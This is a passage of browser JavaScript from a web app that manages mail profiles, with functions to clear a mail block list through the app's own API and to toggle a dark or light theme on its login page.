            if (attachmentsContainer) {
                const checkboxes = attachmentsContainer.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(cb => cb.disabled = false);
            }
        } catch (error) {
            console.error('Failed to stop processing:', error);
        }
    }

    async function clearMailBlocks(profileId) {
        try {
            const response = await fetch(`${API_URL}/mail/clear-blocks`, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ profileId })
            });

            const data = await response.json();

            const profileBlock = document.querySelector(`.profile-item[data-profile-id="${profileId}"][data-profile-type="mail"]`);
            const status = profileBlock.querySelector('.status');

            status.textContent = data.message || 'Block list cleared';
            status.className = 'status success';
        } catch (error) {
            console.error('Failed to clear blocks:', error);
        }
    }

    // --- THEME: Apply immediately on DOMContentLoaded ---
    (function immediateThemeApply() {
        const savedTheme = localStorage.getItem('alphaTheme');
        if (savedTheme === 'dark') {
            document.body.classList.add('dark-mode');
        } else {
            document.body.classList.remove('dark-mode');
        }
    })();

    // --- THEME TOGGLE BUTTON FOR LOGIN PAGE ---
    function renderThemeToggleOnly() {
        document.getElementById('theme-toggle-login')?.remove();
        const btn = document.createElement('button');
        btn.id = 'theme-toggle-login';
        btn.className = 'button';
        btn.style.position = 'fixed';
        btn.style.top = '10px';
        btn.style.right = '10px';
        btn.style.zIndex = '1000';
        btn.style.background = '#333';
        btn.style.color = '#fff';
        function setTheme(isDark) {
            document.body.classList.toggle('dark-mode', isDark);
            btn.textContent = isDark ? '☀️ Day Mode' : '🌙 Night Mode';
        }
        const savedTheme = localStorage.getItem('alphaTheme');
        setTheme(savedTheme === 'dark');
        btn.addEventListener('click', () => {
            const isDark = !document.body.classList.contains('dark-mode');
            setTheme(isDark);
            localStorage.setItem('alphaTheme', isDark ? 'dark' : 'light');
        });
        document.body.appendChild(btn);
    }

    // Show theme toggle on login page initially
    renderThemeToggleOnly();

    // Remove login theme toggle and show full top-right buttons after login/session restore
    function addLogoutButton() {
        document.getElementById('theme-toggle-login')?.remove();
        renderTopRightButtons();
        syncAllProfileProcessingStates();
        startProcessingSync();
    }
})
